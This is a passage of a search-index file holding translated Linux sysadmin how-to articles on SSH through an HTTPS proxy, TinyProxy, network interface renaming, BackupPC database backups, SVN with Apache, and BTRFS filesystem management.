linkhttp://fedoraproject.org/wiki/How_to_create_an_RPM_package\nhttp://www.mindtwist.de/main/linux/3-linux-tipps/32-how-to-convert-tar-gz-archive-to-rpm-.html\n"
            }
        );
    index.add(
            {
                id:  308 ,
                href: "\/Outrepasser_les_proxy_HTTPS_pour_SSH\/",
                title: "Bypassing HTTPS Proxies for SSH",
                description: "Guide to bypass corporate proxies and allow SSH connections through port 443 when standard ports are blocked",
                content: "Introduction linkThose workplace proxies can be really annoying! But there are always solutions!\nSo here’s the situation: I want to access a remote machine via SSH, but only ports 80 and 443 are allowed. Even if you configure the SSH server on port 443, you’ll notice it doesn’t work.\nA solution? Yes: connect-proxy.\nInstallation linkSeveur linkOn the server, simply modify the sshd_config file to make SSH listen on port 443:\nPort 443 And restart the SSH service.\nPS: If you don’t want to run SSH on port 443, you can use SSLH method to multiplex SSL and SSH on the same port.\nClient linkDebian / Ubuntu linkInstall connect-proxy:\naptitude install connect-proxy Mac linkLet’s compile it:\ncd /private/tmp wget http://www.meadowy.org/~gotoh/ssh/connect.c gcc connect.c -o connect -lresolv sudo cp connect /usr/bin sudo chmod 555 /usr/bin/connect sudo chown root:wheel /usr/bin/connect Others linkYou’ll need to compile it:\ncd /tmp/ wget http://www.meadowy.org/~gotoh/ssh/connect.c gcc connect.c -o connect sudo cp connect /usr/local/bin/ sudo chmod +x /usr/local/bin/connect Configuration linkCreate or edit your SSH config file (~/.ssh/config):\n## Outside of the firewall, with HTTPS proxy Host my_ssh_server_i_want_to_reach ProxyCommand connect -H annoying_proxy:3128 %h 443 ## Inside the firewall (do not use proxy) Host * ProxyCommand connect %h %p The configuration is complete, now you just need to connect:\nssh my_ssh_server Resources linkhttp://www.zeitoun.net/articles/ssh-through-http-proxy/start\n"
            }
        );
    index.add(
            {
                id:  309 ,
                href: "\/TinyProxy:_Mise_en_place_d\u0027un_proxy_simple_et_rapide\/",
                title: "TinyProxy: Setting up a Simple and Fast Proxy",
                description: "Learn how to set up TinyProxy, a lightweight alternative to Squid that simplifies proxy configuration for all your applications.",
                content: " Software version 1.8.3 Operating System Debian 7 Website TinyProxy Website Last Update 27/07/2012 Introduction linkTinyProxy is a proxy server, similar to Squid, but designed to be lightweight. I use it at work on my machine for all my applications. The advantage is having the proxy configuration for wget, apt, etc., pointing to localhost. This way, in the TinyProxy configuration, you only need to configure the proxy server you want to connect to, and all your applications will be redirected without having to reconfigure them every time there’s a change :-)\nInstallation linkOn Debian:\naptitude install tinyproxy Configuration linkI’ll skip explaining all the configuration file lines and will show you the ones I’ve used:\n(/etc/tinyproxy.conf)\n[...] # # Port: Specify the port which tinyproxy will listen on. Please note # that should you choose to run on a port lower than 1024 you will need # to start tinyproxy using root. # We specify here the listening port for Tiny proxy Port 3128 # # Listen: If you have multiple interfaces this allows you to bind to # only one. If this is commented out, tinyproxy will bind to all # interfaces present. # The IP on which it should run Listen 127.0.0.1 [...] # # Upstream: # # Turns on upstream proxy support. # # The upstream rules allow you to selectively route upstream connections # based on the host/domain of the site being accessed. # # For example: # # connection to test domain goes through testproxy # upstream testproxy:8008 \".test.domain.invalid\" # upstream testproxy:8008 \".our_testbed.example.com\" # upstream testproxy:8008 \"192.168.128.0/255.255.254.0\" # # # no upstream proxy for internal websites and unqualified hosts # no upstream \".internal.example.com\" # no upstream \"www.example.com\" # no upstream \"10.0.0.0/8\" # no upstream \"192.168.0.0/255.255.254.0\" # no upstream \".\" # # # connection to these boxes go through their DMZ firewalls # upstream cust1_firewall:8008 \"testbed_for_cust1\" # upstream cust2_firewall:8008 \"testbed_for_cust2\" # # # default upstream is internet firewall # upstream firewall.internal.example.com:80 # # The LAST matching rule wins the route decision. As you can see, you # can use a host, or a domain: # name matches host exactly # .name matches any host in domain \"name\" # . matches any host with no domain (in 'empty' domain) # IP/bits matches network/mask # IP/mask matches network/mask # The proxy server it should point to (the one you normally configure your applications for) Upstream proxy.deimos.fr:3128 [...] # # Allow: Customization of authorization controls. If there are any # access control keywords then the default action is to DENY. Otherwise, # the default action is ALLOW. # # The order of the controls are important. All incoming connections are # tested against the controls based on order. # We authorize localhost Allow 127.0.0.1 All you need to do now is configure your applications to use it :-)\n"
            }
        );
    index.add(
            {
                id:  310 ,
                href: "\/Renommer_les_interfaces_r%C3%A9seaux_en_ethX\/",
                title: "Rename Network Interfaces to ethX",
                description: "How to rename modern Linux network interfaces back to the classic ethX naming convention",
                content: "Introduction linkYou’ve probably noticed that the recent trend in some Linux distributions is to name network cards not by ethX, but by their chipset. So we end up with em0, em1 or whatever…\nThis idea probably came from Solaris, but personally, I don’t see the benefit, especially since it’s more of a hindrance when you want to standardize an IT infrastructure. The purpose of this article is to show how to return to the good old ethX interfaces. I recommend reading the article on Udev before starting this one, to better understand certain aspects.\nImplementation linkGrub linkWe’re going to add this argument (biosdevname=0) to the classic grub line to indicate at boot that we don’t want the interface renaming to take effect. Here’s an example:\n[...] title Red Hat Enterprise Linux (2.6.32-220.el6.x86_64) root (hd0,0) kernel /vmlinuz-2.6.32-220.el6.x86_64 ro root=/dev/mapper/vgos-root rd_NO_LUKS KEYBOARDTYPE=pc KEYTABLE=fr LANG=en_US.UTF-8 rd_LVM_LV=vgos/root rd_NO_MD rd_LVM_LV=vgos/swap SYSFONT=latarcyrheb-sun16 crashkernel=128M biosdevname=0 rd_NO_DM intel_idle.max_cstate=0 initrd /initramfs-2.6.32-220.el6.x86_64.img [...] Udev linkYou either have the choice to redo a clean configuration by changing the interface names in the udev network rules (NAME=“xxxx”):\n# This file was automatically generated by the /lib/udev/write_net_rules # program, run by the persistent-net-generator.rules rules file. # # You can modify it, as long as you keep each rule on a single # line, and change only the value of the NAME= key. SUBSYSTEM==\"net\", ACTION==\"add\", DRIVERS==\"?*\", ATTR{address}==\"d4:ae:52:9b:5a:85\", ATTR{type}==\"1\", KERNEL==\"eth*\", NAME=\"eth0\" Or simply delete the file (I’ve encountered cases where this didn’t work).\nConfiguration Files linkYou will then need to modify your network configurations and set the correct interfaces.\nDebian linkFor example, on Debian, you’ll need to adapt the /etc/network/interfaces configuration with the correct interfaces (ethX).\nRed Hat linkOn Red Hat, you’ll need to rename the /etc/sysconfig/network-scripts/ifcfg-* interfaces and enter each of them to set the associated devices. For this Red Hat part, I find it so tedious that I made a script that will automatically modify udev and interfaces. Here it is:\n#!/bin/bash # Made by Pierre Mavro / Deimos # This script rename interfaces to get ethX instead of chipset name # Backup existing file if [ -e /etc/udev/rules.d/70-persistent-net.rules ] ; then cp /etc/udev/rules.d/70-persistent-net.rules{,.bak} fi # Generate 70-persistent-net.rules file echo \"# Generated by Kickstart/Puppet # This file was automatically generated by the /lib/udev/write_net_rules # program, run by the persistent-net-generator.rules rules file. # # You can modify it, as long as you keep each rule on a single # line, and change only the value of the NAME= key. \" \u003e /etc/udev/rules.d/70-persistent-net.rules i=0 for m in `ip link show | grep \"^\\s*link\" | grep -v loopback | uniq | sort | awk '{ print $2 }'` ; do # Change sysconfig file myifname=$(grep -li \"$m\" /etc/sysconfig/network-scripts/ifcfg-* | awk -F'ifcfg-' '{ print $2 }' | grep -v bond) perl -pi -e \"s/^DEVICE=.*/DEVICE=\\\"eth$i\\\"/\" /etc/sysconfig/network-scripts/ifcfg-$myifname mv /etc/sysconfig/network-scripts/ifcfg-{$myifname,eth$i} # Change udev rule echo 'SUBSYSTEM==\"net\", ACTION==\"add\", DRIVERS==\"?*\", ATTR{address}==\"'$m'\", ATTR{type}==\"1\", KERNEL==\"eth*\", NAME=\"eth'$i'\"' \u003e\u003e /etc/udev/rules.d/70-persistent-net.rules echo '' \u003e\u003e /etc/udev/rules.d/70-persistent-net.rules let i++ done All you need to do now is reboot :-)\nReferences linkhttp://www.sysarchitects.com/em1_to_eth0\n"
            }
        );
    index.add(
            {
                id:  311 ,
                href: "\/BackupPC_:_Un_outil_complet_de_backup\/",
                title: "BackupPC: A Complete Backup Tool",
                description: "How to install, configure and use BackupPC to backup all your data including Windows hosts and SQL databases.",
                content: "Introduction linkIf you’re looking for a beautiful tool for making backups and restorations, look no further, BackupPC is for you.\nConfiguration linkWindows Host via SMB linkYou can backup via network shares. For this on Windows, set up your share, and for the machine here’s an example:\n#============================================================= -*-perl-*- # # Configuration file for Windows hosts. # Note the slashes instead of backslashes # ########################################################################### # What to backup and when to do it ########################################################################### #Array of directories to backup $Conf{BackupFilesOnly} = ['/Documents and Settings', 'Travail']; #Array of directories excluded from backup $Conf{BackupFilesExclude} = '/Documents and Setings/user1/Local Settings/Temp'; ########################################################################### # General per-PC configuration settings ########################################################################### #NetBios name of the machine $Conf{ClientNameAlias} = 'netbiosname'; #Backup method used $Conf{XferMethod} = 'smb'; #Verbosity level of log files $Conf{XferLogLevel} = 1; #Name of shares to backup $Conf{SmbShareName} = ['C$']; #Network user name $Conf{SmbShareUserName} = 'Administrateur'; #Network user password $Conf{SmbSharePasswd} = 'secret'; #Backup compression method $Conf{ArchiveComp} = 'bzip2'; Windows Host via rsync linkWe’ll use the method where we’ll do without Cygwin. You can use the method with Cygwin, but don’t install both simultaneously.\nTo begin, download cwrsync and install it on the Windows machine. During installation, it will create a user with a randomly generated password, leave it as is. This user is dedicated to starting the rsyncd service.\nThen, go to the folder “C:\\Program Files (x86)\\ICW”, then edit the configuration file:\nuse chroot = false strict modes = false hosts allow = * log file = rsyncd.log # Module definitions # Remember cygwin naming conventions : c:\\work becomes /cygwin/c/work # [share] path = /cygdrive/c/share comment = share rsync read only = yes transfer logging = yes hosts allow = 192.168.0.14 secrets file = rsyncd.secrets auth users = backuppc Adapt the following lines:\npath: /cygdrive/ is mandatory. Then use the letter of the drive you’re interested in (here ‘c’), then the folder in question (here ‘share’) (which gives ‘/cygdrive/c/share’ for ‘C:\\share’). comment: a small comment line read only: set it to yes, because only backuppc should access it and it doesn’t need specific write permissions hosts allow: specify the IP of the backuppc server secret file: contains a file with logins and passwords of users authorized to connect auth users: specifies which user is authorized to connect. I have therefore created a specific user called backuppc on the machine and given it specific rights (security tab) to the “C:\\share” folder\nNow, we’ll create a rsyncd.secrets file containing users and passwords. We’ll need to authorize the backuppc user to connect to the rsyncd service:\nuser:password The configuration is quite simple, which would give me for example: backuppc:password\nOnce that’s done, restart the ‘RsyncServer’ service in the services list.\nOn the backuppc server, the configuration of the server in question looks like this:\n$Conf{XferMethod} = 'rsyncd'; $Conf{RsyncShareName} = [ 'factory' ]; $Conf{RsyncdPasswd} = 'password'; $Conf{RsyncdUserName} = 'backuppc'; Reload backuppc and you’re good to go.\nBacking up SQL Databases linkMySQL linkTo backup SQL databases (MySQL for example), it’s preferable to create an SQL account dedicated to backups (backuppc for example) and assign it select and lock rights on all databases:\n$ mysql -uroot -p CREATE USER 'backuppc'@'localhost' IDENTIFIED BY 'password'; GRANT SELECT , LOCK TABLES ON * . * TO 'backuppc'@'localhost' IDENTIFIED BY 'password' WITH MAX_QUERIES_PER_HOUR 0 MAX_CONNECTIONS_PER_HOUR 0 MAX_UPDATES_PER_HOUR 0 MAX_USER_CONNECTIONS 0; FLUSH PRIVILEGES; Backup All Databases at Once linkThe advantage of this method is simplicity, but it doesn’t allow restoration database by database.\nIn your host configuration on backuppc, add this line and adapt it to your needs:\n... $Conf{DumpPreUserCmd} = '$sshPath -q -x -l root $host /usr/bin/mysqldump -ubackuppc -ppassword -e --single-transaction --opt --all-databases \u003e /tmp/dump.sql'; ... Ideally, at the end of the backup, you should delete this dump (for security reasons):\n... $Conf{DumpPostUserCmd} = '$sshPath -q -x -l root $host rm -f /tmp/dump.sql'; ... Backup Database by Database linkThis more tedious method has the advantage of backing up database by database which allows you to restore only the database you’re interested in in case of a problem.\nAdditionally, it includes on-the-fly compression of your database. However, you’ll need to install 7zip first (I chose 7zip for better compression).\nWe’ll create a script that we’ll place in /etc/scripts for example:\n#!/bin/bash user='root' password='password' destination='/tmp/backups_sql' mail='my@mail.com' mkdir -p $destination for i in `echo \"show databases;\" | mysql -u$user -p$password | grep -v Database`; do mysqldump -u$user -p$password --opt --add-drop-table --routines --triggers --events --single-transaction --master-data=2 -B $i | 7z a -t7z -mx=9 -si $destination/$i.sql.7z done problem_text='' problem=0 for i in `ls $destination/*`; do size=`du -sk $i | awk '{ print $1 }'` if [ $size -le 4 ]; then problem_text=\"$problem_text- $i database. Backupped database size is equal or under 4k ($size)\\n\" problem=1 fi done if [ $problem -ne 0 ]; then echo -e \"Backups problem detected on:\\n\\n$problem_text\" | mail -s \"$HOSTNAME - MySQL backup problem\" $mail fi The problem here is the password in clear text. So make sure to restrict to the user who will backup:\nchmod 700 /etc/scripts/backup_mysql_databases.sh In your host configuration on backuppc, add this line and adapt it to your needs:\n... $Conf{DumpPreUserCmd} = '$sshPath -q -x -l root $host /etc/scripts/backup_mysql_databases.sh'; ... Ideally, at the end of the backup, you should delete this dump (for security reasons):\n... $Conf{DumpPostUserCmd} = '$sshPath -q -x -l root $host rm -Rf /tmp/backups_sql'; ... PostgreSQL linkTo backup Postgres databases, we need to do as usual, an SSH key exchange but for the postgres user.\nBackup All Databases at Once linkThe advantage of this method is simplicity, but it doesn’t allow restoration database by database.\nIn your host configuration on backuppc, add this line and adapt it to your needs:\n... $Conf{DumpPreUserCmd} = '$sshPath -q -x -l postgres $host /usr/bin/pg_dump \u003e /tmp/dump.sql'; ... Ideally, at the end of the backup, you should delete this dump (for security reasons):\n... $Conf{DumpPostUserCmd} = '$sshPath -q -x -l root $host rm -f /tmp/dump.sql'; ... Backup Database by Database linkThis more tedious method has the advantage of backing up database by database which allows you to restore only the database you’re interested in in case of a problem.\nAdditionally, it includes on-the-fly compression of your database. However, you’ll need to install 7zip first (I chose 7zip for better compression).\nWe’ll create a script that we’ll place in /etc/scripts for example:\n#!/bin/bash destination='/tmp/backups_pgsql' mail='my@mail.fr' mkdir -p $destination || echo -e \"Backups problem detected on:\\n\\n$problem_text\" | mail -s \"Can't create $destination folder\" $mail for i in `psql -l | grep \"^\\ [a-zA-Z0-9]\" | grep -v 'template[0|1]' | cut -d\\| -f1`; do /usr/bin/pg_dump $i | 7z a -t7z -mx=9 -si $destination/$i.sql.7z done problem_text='' problem=0 for i in `ls $destination/*`; do size=`du -sk $i | awk '{ print $1 }'` if [ $size -le 4 ]; then problem_text=\"$problem_text- $i database. Backupped database size is equal or under 4k ($size)\\n\" problem=1 fi done if [ $problem -ne 0 ]; then echo -e \"Backups problem detected on:\\n\\n$problem_text\" | mail -s \"$HOSTNAME - Postgres backup problem\" $mail fi A little security doesn’t hurt:\nchmod 744 /etc/scripts/backup_postgres_databases.sh chown postgres /etc/scripts/backup_postgres_databases.sh In your host configuration on backuppc, add this line and adapt it to your needs:\n... $Conf{DumpPreUserCmd} = '$sshPath -q -x -l postgres $host /etc/scripts/backup_postgres_databases.sh'; ... Ideally, at the end of the backup, you should delete this dump (for security reasons):\n... $Conf{DumpPostUserCmd} = '$sshPath -q -x -l root $host rm -Rf /tmp/backups_sql'; ... Restoration by Script linkHere’s a script that allows you to do restoration:\n#!/bin/bash # Script for restoring hosts (last full backup) from command line. # The restored backups can be found in $RESTOREDIR (defined below), # and are to be written on tape. BACKUPPCDIR=/srv/backuppc-data HOSTSDIR=$BACKUPPCDIR/pc RESTOREDIR=$HOSTSDIR/restore/restore # put the hosts/directories you do not want to restore into egrep... HOSTS=$(ls $HOSTSDIR | egrep -v '(HOST_CONFIG_FILES|restore)' | tr / \" \") # or use: # HOSTS=\"HOST1 HOST2 REMOTE3\" # no need to change anything below... DATE=$(date +%F) mkdir -p $RESTOREDIR/$DATE for HOST in $HOSTS do # find the last full backup NUMBER=$(grep full $HOSTSDIR/$HOST/backups| tail -1 | cut -f1) if [ \"$NUMBER\" ] then # do the backup for the host $BACKUPPCDIR/bin/BackupPC_archiveHost $BACKUPPCDIR/bin/BackupPC_tarCreate /usr/bin/split /usr/bin/par2 \\ \"$HOST\" \"$NUMBER\" /usr/bin/gzip .gz 0000000 $RESTOREDIR/$DATE 0 \\* fi done FAQ linkProblem Creating Link When Starting the Service linkIf you encounter this type of error message:\n2008-04-20 17:55:46 Can't create a test hardlink between a file in /var/lib/backuppc/pc and /var/lib/backuppc/cpool. Either these are different file systems, or this file system doesn't support hardlinks, or these directories don't exist, or there is a permissions problem, or the file system is out of inodes or full. Use df, df -i, and ls -ld to check each of these possibilities. Quitting... Check the rights etc… otherwise, if you’re using encfs cryptology, then it comes from that and I invite you to follow this linkthis link\nI Lost the Backup Numbers When I Want to Restore Data linkIf you still have your data but your backups and backups.old files are corrupted, there’s still a way to recreate the backup indexing to be able to recover the data. If you want to reindex everything, run this:\n/usr/share/backuppc/bin/BackupPC_fixupBackupSummary Otherwise, if you just want to do a single machine, add this at the end:\n$ /usr/share/backuppc/bin/BackupPC_fixupBackupSummary -l localhost Doing host localhost Reading /var/lib/backuppc/pc/localhost/0/backupInfo Reading /var/lib/backuppc/pc/localhost/1/backupInfo Reading /var/lib/backuppc/pc/localhost/2/backupInfo Reading /var/lib/backuppc/pc/localhost/204/backupInfo Reading /var/lib/backuppc/pc/localhost/206/backupInfo Reading /var/lib/backuppc/pc/localhost/207/backupInfo If you have a Perl error, you’re probably missing the Perl “Time::ParseDate” package, do this:\napt-get install libtime-modules-perl Resources link BackupPC Documentation Documentation on Backuppc on Debian "
            }
        );
    index.add(
            {
                id:  312 ,
                href: "\/Installation_et_configuration_d%5C%27un_repository_SVN\/",
                title: "Installation and Configuration of an SVN Repository",
                description: "Comprehensive guide to install, configure and use a Subversion (SVN) repository with Apache on Linux systems.",
                content: "Introduction linkIf you want to use Subversion, the successor of CVS, you first need to install Apache 2.\nInstallation linkHere are the packages to install:\naptitude install subversion libapache2-svn subversion-tools Configuration of SVN linkConfiguration of the module linkEdit the “dav_svn” module:\nvi /etc/apache2/mods-enabled/dav_svn.conf Then adapt this configuration for your needs (/etc/apache2/mods-enabled/dav_svn.conf):\n#When the client accesses /svn the URL will be handled #by the directives here, thus by subversion #Loading the subversion module DAV svn # Path to your repository SVNPath ''/usr/local/svn # Path if you have multiple repositories SVNParentPath ''/usr/local/svn #Here we request authentication with password #use htpasswd2 to create the file AuthType Basic AuthName ''\"Subversion Repository\" AuthUserFile ''/etc/apache2/dav_svn.passwd #Here we only request authentication for writing #operations on the repository. Require valid-user Apache Configuration linkAdd this to your “VirtualHost” in Apache configuration (/etc/apache2/site-enabled/default):\nOptions Indexes FollowSymLinks MultiViews AllowOverride None Order allow,deny allow from all Access Definition linkNext, we will create a file containing users authorized to connect:\nhtpasswd -c /etc/apache2/dav_svn.passwd $USER Setting up the repository link Creating a repo (repository): svnadmin create /usr/local/svn/project Importing a project: svn import /home/$USER/project file:///usr/local/svn/project -m \"initial import\" If everything went well, you should see this:\nCommitted revision 1. Verification: svn ls file:///usr/local/svn/project Starting the daemon linkTo start the daemon:\nsvnserve -d -r /usr/local/svn/project --listen-port=3690 Set a listening port. 3690 is the default SVN port.\nLog status: svn log svn://localhost:3690 Usage linkA repository within another repository linkIf, for example, you want to have a repository, then a folder inside it pointing to another repository, it’s possible by going to the folder that will contain the other repositories, then running this command:\nsvn propedit svn:externals . Then, enter the name of the folder you want and the SVN address:\nlib svn://svnsrv/trunk/library lib: the folder containing this SVN repository svn://: the SVN address Here’s another example:\nNagios http://svn/admin/Production/Nagios You can then save this configuration to make it permanent by doing a commit.\nReferences linkSetting up an SVN repo\nApache Subversion Documentation\nSVN and auto updatable working copy Documentation\nSubversion and Trac as Virtual-Hosts documentation\n"
            }
        );
    index.add(
            {
                id:  313 ,
                href: "\/BTRFS_:_Utilisation_du_rempla%C3%A7ant_de_l%27Ext4\/",
                title: "BTRFS: Using the Ext4 Replacement",
                description: "Learn how to use BTRFS filesystem, the replacement for ExtX, including creating partitions, subvolumes, snapshots, compression, and RAID configurations.",
                content: " Software version 0.19 Operating System Debian 7 Website BTRFS Website Last Update 05/07/2012 Others Kernel used:\n3.2.0-2-amd64 Introduction linkBTRFS is the perfect replacement for the aging ExtX filesystem. For those familiar with the ZFS filesystem, BTRFS draws heavily from it.\nBTRFS, like Ext4, is based on the concept of extents. This is a contiguous area (which can reach several hundred MB, unlike the clusters of some older formats) reserved each time a file is saved on the hard drive. This allows, in case of writing at the end of a file (append) or a complete rewrite, to often add the new data directly to the extent rather than in another area of the hard disk, which would increase fragmentation. Large files are thus stored more efficiently through a greater disk space occupation, but at a cost that has decreased considerably. BTRFS stores the data of very small files directly in the extent of the directory file, not in a separate extent.\nBTRFS manages a notion of “subvolumes” allowing, within the filesystem, to have a separate tree (including the root) containing directories and files, giving the possibility to have various trees simultaneously, and therefore a greater independence from the main system. This also allows for better separation of data and imposing different quotas on different subvolumes. The most practical use of this system concerns snapshots. A snapshot offers the possibility to “take a photograph” at a given moment of a filesystem to back it up. This snapshot under BTRFS is a subvolume, which allows it to be modified afterward. Having a snapshot accessible in write mode is of obvious interest for high-availability online databases.\nTo exploit these subvolumes and snapshots, BTRFS uses the classic technique of “Copy-on-write”. If data is written to a memory block, then the block will be copied to another location in the filesystem and the new data will be recorded on the copy instead of on the original. Then the metadata pointing to the block is automatically modified to take into account the new data. We thus have a transactional mechanism distinct from the journaling present in Ext3. Before each write, taking a snapshot of the system would allow, in case of a problem, to return to the snapshot, but this seems to pose, if not performance problems, at least questions: should you take a snapshot at each write, or for a certain volume of data? This also raises the question of time lost at each creation/destruction of a snapshot. The use of snapshots for this purpose is not emphasized by the developers.\nBTRFS has its own data protection techniques: the use of back references (i.e., knowing, from a data block, which metadata points to the block) allows identification of system corruptions. If a file claims to belong to a set of blocks and these blocks claim to be related to another file, this indicates that the consistency of the system is altered. BTRFS also performs checksums on all data and stored metadata to detect all kinds of corruptions on the fly, repair some of them, and thus offer a better level of reliability.\nIt allows hot resizing of the filesystem size (including shrinking it) while maintaining excellent protection of metadata that is duplicated in several places for security. The operation is simple: btrfsctl -r +2g /mnt adds 2 GiB to your filesystem. This function is not intended to be redundant with what the Linux logical volume manager offers but claims to technically complement it.\nChecking the filesystem through the btrfsck program is error-tolerant and presented as extremely fast by its design. The use of B-trees allows exploring the disk structure at a speed essentially limited by the disk’s read speed. The price to pay is a strong memory footprint since btrfsck uses three times more memory than e2fsck.\nBTRFS respects the hierarchy of Linux’s functional “layers”. For example, while offering functions to complement it, it tries as much as possible not to rewrite the whole volume management system proposed as standard by LVM.\nGoogle’s lightweight and fast Snappy compression algorithm was added in January 2012, allowing for faster data access compared to LZO compression (around 10%) and no compression (around 15%).\nIt was followed by the LZ4 compression algorithm in February 2012, which further improves performance compared to Snappy (by about 20-30%).\nInstallation linkWe’ll need to install the BTRFS tools:\naptitude install btrfs-tools parted Usage linkIn my use cases below, many examples will be in relation to a configuration of this type:\n$ fdisk -l Disk /dev/sda: 10.7 GB, 10737418240 bytes 255 heads, 63 sectors/track, 1305 cylinders, total 20971520 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk identifier: 0x0007f48a Device Boot Start End Blocks Id System /dev/sda1 * 2048 5859327 2928640 83 Linux /dev/sda2 5859328 7813119 976896 82 Linux swap / Solaris /dev/sda3 7813120 9910271 1048576 83 Linux /dev/sda4 9910272 16201727 3145728 83 Linux sda3 and sda4 are partitions we’ll be working with.\nCreating a BTRFS Partition linkI have a 3GB partition here (sda4). I’ll format it as BTRFS:\n$ mkfs.btrfs /dev/sda4 WARNING! - Btrfs Btrfs v0.19 IS EXPERIMENTAL WARNING! - see http://btrfs.wiki.kernel.org before using fs created label (null) on /dev/sda4 nodesize 4096 leafsize 4096 sectorsize 4096 size 3.00GB Btrfs Btrfs v0.19 Note: It is strongly recommended to create a BTRFS partition on LVM for future hot resizing!\nMy partition is ready to be mounted:\nmount -t btrfs /dev/sda4 /mnt/ And we can see that the partition is correctly mounted:\n$ mount | grep sda4 /dev/sda4 on /mnt type btrfs (rw,relatime,space_cache) Subvolumes linkJust like ZFS, it’s possible to create subvolumes. That is, in a formatted partition (think of it as a VG under LVM), it’s possible to create subvolumes (LV under LVM) but whose use allows great data flexibility.\nLet’s create our first subvolume:\nbtrfs subvolume create /mnt/volume1 A subvolume is materialized at the directory tree level by a directory present at the root of the volume’s mount point.\n$ btrfs subvolume list /mnt/ ID 145 top level 3 path volume1 The number 145 uniquely identifies our subvolume. The volume1 path is also indicated. The volume1 path, which is also the name of the subvolume, is relative to the root mount of our btrfs volume.\nTo mount a subvolume at the same location:\nmount -o subvol=volume1 /dev/sda4 /mnt/ You can also mount your subvolume from its identifier:\nmount -o subvolid=145 /dev/sda4 /mnt Converting an extX Partition to BTRFS linkIt’s possible to convert an ext3 or ext4 partition to btrfs! In this case, I’ll convert sda3, which is already in ext4. We’ll use the btrfs-convert command:\n$ btrfs-convert /dev/sda3 creating btrfs metadata. creating ext2fs image file. cleaning up system chunk. conversion complete. And there it is, that’s all :-). It’s simple, right! I can now mount it:\nmount -t btrfs /dev/sda3 /mnt/ And verify that everything is good:\n$ mount | grep sda3 /dev/sda3 on /mnt type btrfs (rw,relatime,space_cache) Resizing a Partition linkMethod 1: Filesystem Expansion linkTo increase the size of a partition on the fly, it’s very simple as long as we’re on LVM or if we have the partition that physically has at least the desired size. Otherwise, we’ll need to do a cold operation to expand the partition, then the filesystem. The difference with an ext-type filesystem is that we can specify that the partition size can take a size x without taking the whole (like resize2fs).\n$ btrfs filesystem resize +1G /mnt/ Resize '/mnt/' of '+1G' Method 2: Adding a Device linkWe have another possibility in case our current volume becomes too small… we can add a device to an existing volume. First, let’s get a status of the btrfs volumes present on our system:\n$ btrfs filesystem show failed to read /dev/sr0 Label: none uuid: 9fd825a0-3bee-44b6-88e9-b8e4bc554e82 Total devices 1 FS bytes used 92.00KB devid 1 size 3.00GB used 343.12MB path /dev/sda4 Label: none uuid: 0773e361-0342-4960-8f8e-5a26db8bc93e Total devices 1 FS bytes used 49.40MB devid 1 size 1.00GB used 1.00GB path /dev/sda3 Btrfs Btrfs v0.19 If I look at my mounted partitions:\n$ df -h [...] /dev/sda3 1.0G 50M 640M 8% /mnt I have my sda3 which is 1G. We’ll add sda4 to it:\nbtrfs device add /dev/sda4 /mnt/ Let’s check that /mnt has been enlarged:\n\u003e df -h [...] /dev/sda3 4.0G 50M 3.7G 2% /mnt Method 3: RAID 0 linkThere is a solution like RAID 0, but with data distribution and metadata replication of the filesystem on all disks:\n$ btrfs filesystem balance /mnt $ btrfs filesystem df /mnt/ Data, RAID0: total=3.71GB, used=256.00KB System, RAID1: total=8.00MB, used=8.00KB System: total=4.00MB, used=0.00 Metadata, RAID1: total=344.34MB, used=32.00KB The data is in RAID0 between the different partitions while the system and metadata are RAID1. This means that even if you lose one of the system partitions, you will still be able to mount the remaining partition. However, since the data is not replicated but distributed, you will have lost the data present on the disappeared partition.\nReducing a Partition linkTo reduce a partition on the fly, it’s really very simple, just specify the size, then the mount point on which you want to remove the size:\n$ btrfs filesystem resize -1G /mnt/ Resize '/mnt/' of '-1G' And that’s it :-)\nRAID 1 linkIt’s possible to do software RAID 1. I remind you that you need disks of the same size, or it will be the size of the smallest disk that will be used. Let’s start by initializing our RAID:\nmkfs.btrfs -m raid1 -d raid1 /dev/sda3 /dev/sda4 Then you can mount sda3 or sda4, the replication is done :-)\nCompression linkCold Method linkIt’s possible to have a compressed filesystem. For this, nothing could be simpler:\nmount -t btrfs -o compress=lzo /dev/sda3 /mnt/ If we add the compress-force option, the compression on files that btrfs will be greater. By default, btrfs doesn’t compress well, because for large files it can lead to a lot of I/O. The behavior of btrfs’s on-the-fly compression algorithm therefore tries to spare the processor when it determines according to its first operations if a file can be difficult to compress:\nmount -o compress=zlib,compress-force /dev/sda3 /mnt/ Hot Method linkIf you want to perform the same compression activation operation directly from a mounted btrfs filesystem, we can use the following command which will activate the compression option and compress the data already present on the disk:\nbtrfs filesystem defragment -czlib /mnt Snapshot linkThere are several complementary tools that allow managing snapshots such as Snapper or yum-plugin-fs-snapshot on Fedora/RedHat. But for now, we’ll see how to manage snapshots the standard btrfs way.\nWe create from a volume the snapshot that will allow us to make modifications on this file tree:\nbtrfs subvolume nsnapshot /mnt /mnt/snapshot We now unmount the current volume to mount our snapshot instead in which we create a new file:\numount /mnt/ mount -o subvol=snapshot /dev/sda4 /mnt/ Revert linkIf we want to cancel our modifications, it will be very simple, we will unmount our snapshot and mount the old one:\numount /mnt mount /dev/sda4 /mnt Merge linkIf we want to merge the data, we need to retrieve the ID of our subvolume. Then the set-default order, followed by the subvolume ID followed by the original volume’s mount point allows declaring a new default volume:\n$ btrfs subvolume list /mnt ID 146 top level 5 path snapshot $ btrfs subvolume set-default 146 /mnt References linkhttps://fr.wikipedia.org/wiki/Btrfs\nhttps://www.funtoo.org/wiki/BTRFS_Fun\nhttps://www.rashardkelly.com/extending-a-btrfs-filesystem-2/\n"
            }
        );
    index.add(
            {
                id:  314 ,
                href: "\/Udev_:_Utilisation_d\u0027un_socket_pour_parler_avec_les_devices_kernel\/",
                title: "Udev: Using a Socket to Communicate with Kernel Devices",
                description: "A comprehensive guide on how to use udev for device management on Linux systems, including monitoring, creating custom rules, and handling device detection events",
